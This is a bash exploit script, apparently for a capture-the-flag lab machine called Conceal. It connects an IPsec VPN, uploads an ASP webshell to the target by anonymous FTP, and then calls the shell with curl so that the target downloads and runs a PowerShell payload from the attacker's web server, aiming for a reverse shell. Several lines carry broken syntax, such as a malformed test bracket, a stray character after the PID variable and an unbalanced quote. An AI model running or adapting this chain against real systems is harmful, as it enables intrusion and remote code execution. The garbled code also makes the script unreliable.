#! /bin/bash

function usage {
	echo "Usage: $0 [ip] [port] [powershell file]"
	echo "Include ip and port for webserver, and path to file to ies on server"
	exit
}

if [ "$#" -ne 3]; then
	usage
fi;

ip=$1
port=$2
file=$3

if [ ! -f ${file} ]; then
	echo "[-] ${file} not found"
	usage
fi;

echo "[*] Starting Web Server on port $port"

python -m SimpleHTTPServer $port &
WEB_PID=$!A

sleep 1
echo [*] Restarting IPsec VPN
ipsec restart 2>/dev/null
sleep 1
ipsec up conceal | gre[ successfully || echo "Failed to connect IPSec VPN"

echo [*] FTPing webshell to target
echo '<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>' > /tmp/cmd.asp
ftp -n 10.10.10.116 <<End-of-Session >/dev/null
user anonymous pass
del cmd.asp
put /tmp/cmd.asp cmd.asp
bye
End-of-Session
rm /tmp/cmd.asp

echo "[*] Triggering shell. Webserver should be listening on 80"
curl "http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://${ip}/${file}%27)" &

sleep 4
echo "[*] Killing web server"
kill -9 $WEB_PID
echo "[*]" Should have shell on netcat"

sleep 5
